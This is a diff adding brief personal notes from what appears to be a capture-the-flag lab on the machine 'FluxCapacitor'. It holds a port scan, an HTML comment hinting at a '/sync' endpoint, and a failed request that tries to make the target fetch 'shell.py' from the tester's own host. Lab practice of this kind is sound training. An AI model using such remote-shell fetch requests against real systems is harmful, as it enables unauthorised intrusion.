@@ -1,0 +1,19 @@
+FluxCapacitor 10.10.10.69
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    SuperWAF
+
+
+
+http://10.10.10.69/index.html
+
+note: 
+	<!--
+		Please, add timestamp with something like:
+		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
+	-->
+  
+  http://10.10.10.69/?url=http://10.10.15.142:8000/shell.py
+    Note: Nothing happend. 
+    
+    
